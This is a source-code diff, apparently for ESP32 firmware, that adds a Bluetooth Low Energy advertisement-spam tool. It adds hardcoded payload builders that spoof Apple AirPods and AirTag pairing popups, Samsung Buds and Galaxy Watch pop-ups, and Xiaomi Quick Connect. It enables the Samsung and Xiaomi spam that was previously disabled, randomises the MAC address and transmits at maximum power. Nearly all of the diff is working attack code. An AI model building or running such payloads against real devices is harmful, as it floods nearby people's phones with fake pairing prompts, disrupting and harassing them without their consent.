@@ -78,7 +78,6 @@ const Device devices[] = {
     {"SRS-XB43", 0x1E8B18},
     {"WI-1000XM2", 0x1E955B},
     {"Sony WF-SP700N", 0x1EC95C},
-    {"Galaxy S21 5G", 0x06AE20},
     {"OPPO Enco Air3 Pro", 0x06C197},
     {"Sony WH-1000XM2", 0x06C95C},
     {"soundcore Liberty 4 NC", 0x06D8FC},
@@ -99,18 +98,6 @@ const Device devices[] = {
     {"FBI", 0xE2106F},
     {"Tesla", 0xB37A62},
     {"Ton Upgrade Netflix", 0x92ADC9},
-    {"Fallback Watch", 0x1A},
-    {"White Watch4 Classic 44m", 0x01},
-    {"Black Watch4 Classic 40m", 0x02},
-    {"White Watch4 Classic 40m", 0x03},
-    {"Black Watch4 44mm", 0x04},
-    {"Black Watch4 40mm", 0x07},
-    {"White Watch4 40mm", 0x08},
-    {"Black Watch5 44mm", 0x11},
-    {"Black Watch5 Pro 45mm", 0x15},
-    {"White Watch5 44mm", 0x17},
-    {"White & Black Watch5", 0x18},
-    {"Black Watch6 Classic 43m", 0x1E},
 };
 const int devicesCount = sizeof(devices) / sizeof(devices[0]);
 
@@ -149,6 +136,135 @@ const AppleDeviceMapping appleDevices[] = {
 };
 const int appleDevicesCount = sizeof(appleDevices) / sizeof(appleDevices[0]);
 
+// Apple Device Popup payloads.
+struct ApplePopupDevice {
+    const char* name;
+    uint16_t deviceId;
+};
+
+static const ApplePopupDevice applePopupDevices[] = {
+    {"AirPods Pro", 0x0E20}, {"AirPods Pro 2nd Gen", 0x1420},
+    {"AirPods Pro 2nd Gen USB-C", 0x2420}, {"AirPods 4 ANC", 0x2820},
+    {"AirPods 4", 0x2920}, {"AirPods Max USB-C", 0x2B20},
+    {"Beats Powerbeats Pro 2", 0x2C20}, {"Beats Solo 3", 0x0620},
+    {"AirPods Max", 0x0A20}, {"Beats Flex", 0x1020},
+    {"AirTag", 0x0055}, {"Hermes AirTag", 0x0030},
+    {"AirPods", 0x0220}, {"AirPods 2nd Gen", 0x0F20},
+    {"AirPods 3rd Gen", 0x1320}, {"Powerbeats 3", 0x0320},
+    {"Powerbeats Pro", 0x0B20}, {"Beats Solo Pro", 0x0C20},
+    {"Beats Studio Buds", 0x1120}, {"Beats X", 0x0520},
+    {"Beats Studio 3", 0x0920}, {"Beats Studio Pro", 0x1720},
+    {"Beats Fit Pro", 0x1220}, {"Beats Studio Buds+", 0x1620},
+    {"Beats Solo 4", 0x2520}, {"Beats Solo Buds", 0x2620},
+    {"Powerbeats Fit", 0x2F20}
+};
+const int applePopupDevicesCount = sizeof(applePopupDevices) / sizeof(applePopupDevices[0]);
+
+struct SamsungSpamDevice {
+    const char* name;
+    uint8_t type;
+    uint8_t a;
+    uint8_t b;
+    uint8_t c;
+};
+
+static const SamsungSpamDevice samsungSpamDevices[] = {
+    {"Fallback Buds", 0, 0xEE, 0x7A, 0x0C}, {"Fallback Dots", 0, 0x9D, 0x17, 0x00},
+    {"Light Purple Buds2", 0, 0x39, 0xEA, 0x48}, {"Bluish Silver Buds2", 0, 0xA7, 0xC6, 0x2C},
+    {"Black Buds Live", 0, 0x85, 0x01, 0x16}, {"Gray & Black Buds2", 0, 0x3D, 0x8F, 0x41},
+    {"Bluish Chrome Buds2", 0, 0x3B, 0x6D, 0x02}, {"Gray Beige Buds2", 0, 0xAE, 0x06, 0x3C},
+    {"Pure White Buds", 0, 0xB8, 0xB9, 0x05}, {"Pure White Buds2", 0, 0xEA, 0xAA, 0x17},
+    {"Black Buds", 0, 0xD3, 0x07, 0x04}, {"French Flag Buds", 0, 0x9D, 0xB0, 0x06},
+    {"Dark Purple Buds Live", 0, 0x10, 0x1F, 0x1A}, {"Dark Blue Buds", 0, 0x85, 0x96, 0x08},
+    {"Pink Buds", 0, 0x8E, 0x45, 0x03}, {"White & Black Buds2", 0, 0x2C, 0x67, 0x40},
+    {"Bronze Buds Live", 0, 0x3F, 0x67, 0x18}, {"Red Buds Live", 0, 0x42, 0xC5, 0x19},
+    {"Black & White Buds2", 0, 0xAE, 0x07, 0x3A}, {"Sleek Black Buds2", 0, 0x01, 0x17, 0x16},
+    {"Ocean Blue Buds", 0, 0x12, 0x34, 0x56}, {"Forest Green Buds", 0, 0x65, 0x43, 0x21},
+    {"Sunset Orange Buds", 0, 0x78, 0x9A, 0xBC}, {"Midnight Black Buds", 0, 0xDE, 0xF1, 0x23},
+    {"Rose Gold Buds", 0, 0x45, 0x67, 0x89}, {"Electric Yellow Buds", 0, 0xAB, 0xC1, 0x23},
+    {"Crimson Red Buds", 0, 0x32, 0x16, 0x54}, {"Arctic White Buds", 0, 0x98, 0x76, 0x54},
+    {"Mystic Purple Buds", 0, 0x65, 0x49, 0x87}, {"Golden Buds", 0, 0x32, 0x19, 0x87},
+    {"Fallback Watch", 1, 0x1A, 0, 0}, {"White Watch4 Classic 44m", 1, 0x01, 0, 0},
+    {"Black Watch4 Classic 40m", 1, 0x02, 0, 0}, {"White Watch4 Classic 40m", 1, 0x03, 0, 0},
+    {"Black Watch4 44mm", 1, 0x04, 0, 0}, {"Silver Watch4 44mm", 1, 0x05, 0, 0},
+    {"Green Watch4 44mm", 1, 0x06, 0, 0}, {"Black Watch4 40mm", 1, 0x07, 0, 0},
+    {"White Watch4 40mm", 1, 0x08, 0, 0}, {"Gold Watch4 40mm", 1, 0x09, 0, 0},
+    {"French Watch4", 1, 0x0A, 0, 0}, {"French Watch4 Classic", 1, 0x0B, 0, 0},
+    {"Fox Watch5 44mm", 1, 0x0C, 0, 0}, {"Black Watch5 44mm", 1, 0x11, 0, 0},
+    {"Sapphire Watch5 44mm", 1, 0x12, 0, 0}, {"Purplish Watch5 40mm", 1, 0x13, 0, 0},
+    {"Gold Watch5 40mm", 1, 0x14, 0, 0}, {"Black Watch5 Pro 45mm", 1, 0x15, 0, 0},
+    {"Gray Watch5 Pro 45mm", 1, 0x16, 0, 0}, {"White Watch5 44mm", 1, 0x17, 0, 0},
+    {"White & Black Watch5", 1, 0x18, 0, 0}, {"Black Watch6 Pink 40mm", 1, 0x1B, 0, 0},
+    {"Gold Watch6 Gold 40mm", 1, 0x1C, 0, 0}, {"Silver Watch6 Cyan 44mm", 1, 0x1D, 0, 0},
+    {"Black Watch6 Classic 43m", 1, 0x1E, 0, 0}, {"Green Watch6 Classic 43m", 1, 0x20, 0, 0},
+    {"Midnight Black Watch6", 1, 0x21, 0, 0}, {"Ocean Blue Watch6", 1, 0x22, 0, 0},
+    {"Rose Gold Watch6", 1, 0x23, 0, 0}, {"Electric Yellow Watch6", 1, 0x24, 0, 0},
+    {"Crimson Red Watch6", 1, 0x25, 0, 0}, {"Arctic White Watch6", 1, 0x26, 0, 0},
+    {"Mystic Purple Watch6", 1, 0x27, 0, 0}, {"Golden Watch6", 1, 0x28, 0, 0},
+    {"Forest Green Watch6", 1, 0x29, 0, 0}, {"Sunset Orange Watch6", 1, 0x2A, 0, 0},
+    {"Black Galaxy Watch7 44mm", 1, 0x30, 0, 0}, {"Green Galaxy Watch7 44mm", 1, 0x31, 0, 0},
+    {"Cream Galaxy Watch7 40mm", 1, 0x32, 0, 0}, {"Green Galaxy Watch7 40mm", 1, 0x33, 0, 0},
+    {"White Galaxy Watch7 Classic", 1, 0x34, 0, 0}, {"Black Galaxy Watch7 Classic", 1, 0x35, 0, 0},
+    {"Titanium White Watch Ultra", 1, 0x40, 0, 0}, {"Titanium Black Watch Ultra", 1, 0x41, 0, 0},
+    {"Titanium Silver Watch Ultra", 1, 0x42, 0, 0}, {"Black Galaxy Ring", 1, 0x60, 0, 0},
+    {"Gold Galaxy Ring", 1, 0x61, 0, 0}, {"Silver Galaxy Ring", 1, 0x62, 0, 0}
+};
+const int samsungSpamDevicesCount = sizeof(samsungSpamDevices) / sizeof(samsungSpamDevices[0]);
+
+static uint8_t buildApplePopup(uint8_t* buf, uint16_t deviceId) {
+    uint8_t i = 0;
+    buf[i++] = 0x1E; buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
+    buf[i++] = 0x07; buf[i++] = 0x19; buf[i++] = 0x07;
+    buf[i++] = (uint8_t)(deviceId >> 8); buf[i++] = (uint8_t)deviceId;
+    buf[i++] = 0x55;
+    for (uint8_t j = 0; j < 3; j++) buf[i++] = random(256);
+    buf[i++] = 0x00; buf[i++] = 0x00;
+    for (uint8_t j = 0; j < 16; j++) buf[i++] = random(256);
+    return i;
+}
+
+static uint8_t buildXiaomiQuickConnect(uint8_t* buf) {
+    uint8_t i = 0;
+    buf[i++] = 0x1B; buf[i++] = 0xFF; buf[i++] = 0x8F; buf[i++] = 0x03;
+    buf[i++] = 0x16; buf[i++] = 0x01; buf[i++] = 0x20;
+    buf[i++] = random(256); buf[i++] = random(256);
+    buf[i++] = 0x17; buf[i++] = 0x0A; buf[i++] = 0x00; buf[i++] = 0x00;
+    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x88; buf[i++] = 0x50;
+    buf[i++] = 0x11; buf[i++] = 0xB1; buf[i++] = 0xFF;
+    buf[i++] = random(256); buf[i++] = random(256);
+    for (uint8_t j = 0; j < 6; j++) buf[i++] = 0x00;
+    return i;
+}
+
+static uint8_t buildSamsungBuds(uint8_t* buf, uint8_t r, uint8_t g, uint8_t b) {
+    uint8_t i = 0;
+    buf[i++] = 0x1B; buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
+    buf[i++] = 0x42; buf[i++] = 0x09; buf[i++] = 0x81; buf[i++] = 0x02;
+    buf[i++] = 0x14; buf[i++] = 0x15; buf[i++] = 0x03; buf[i++] = 0x21;
+    buf[i++] = 0x01; buf[i++] = 0x09; buf[i++] = r; buf[i++] = g;
+    buf[i++] = 0x01; buf[i++] = b; buf[i++] = 0x06; buf[i++] = 0x3C;
+    buf[i++] = 0x94; buf[i++] = 0x8E; buf[i++] = 0x00; buf[i++] = 0x00;
+    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0xC7; buf[i++] = 0x00;
+    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75;
+    return i;
+}
+
+static uint8_t buildSamsungWatch(uint8_t* buf, uint8_t watchId) {
+    uint8_t i = 0;
+    buf[i++] = 0x0E; buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
+    buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x02; buf[i++] = 0x00;
+    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0xFF; buf[i++] = 0x00;
+    buf[i++] = 0x00; buf[i++] = 0x43; buf[i++] = watchId;
+    return i;
+}
+
+const char* getSpamDeviceName(EBLEPayloadType type, uint32_t index) {
+    if (type == AppleJuice) return applePopupDevices[index % applePopupDevicesCount].name;
+    if (type == Samsung) return samsungSpamDevices[index % samsungSpamDevicesCount].name;
+    if (type == Xiaomi) return "Xiaomi";
+    return "";
+}
+
 void generateRandomMac(uint8_t *mac) {
     for (int i = 0; i < 6; i++) {
         mac[i] = random(256);
@@ -156,7 +272,7 @@ void generateRandomMac(uint8_t *mac) {
     mac[5] |= 0xC0;
 }
 
-BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
+BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, uint32_t index) {
     BLEAdvertisementData AdvData = BLEAdvertisementData();
     uint8_t *AdvData_Raw = nullptr;
     uint8_t i = 0;
@@ -188,10 +304,22 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
         case AppleJuice: {
-            int index = random(appleDevicesCount);
-            uint8_t* packet = appleDevices[index].packet;
-            uint8_t packetSize = appleDevices[index].size;
-
+            const ApplePopupDevice& device = applePopupDevices[index % applePopupDevicesCount];
+            uint8_t packet[31];
+            AdvData.addData(packet, buildApplePopup(packet, device.deviceId));
+            break;
+        }
+        case Xiaomi: {
+            uint8_t packet[31];
+            AdvData.addData(packet, buildXiaomiQuickConnect(packet));
+            break;
+        }
+        case Samsung: {
+            const SamsungSpamDevice& device = samsungSpamDevices[index % samsungSpamDevicesCount];
+            uint8_t packet[31];
+            uint8_t packetSize = device.type == 0
+                ? buildSamsungBuds(packet, device.a, device.b, device.c)
+                : buildSamsungWatch(packet, device.a);
             AdvData.addData(packet, packetSize);
             break;
         }
@@ -226,11 +354,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
     return AdvData;
 }
 
-void Spam(EBLEPayloadType type) {
-    if (type == Xiaomi || type == Samsung) {
-        return;
-    }
-
+void Spam(EBLEPayloadType type, uint32_t index) {
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
     if (!pAdvertising) {
         return;
@@ -246,7 +370,7 @@ void Spam(EBLEPayloadType type) {
     NimBLEDevice::setOwnAddr(macAddr);
 
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
+    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, index);
     BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
 
     pAdvertising->setAdvertisementData(advertisementData);
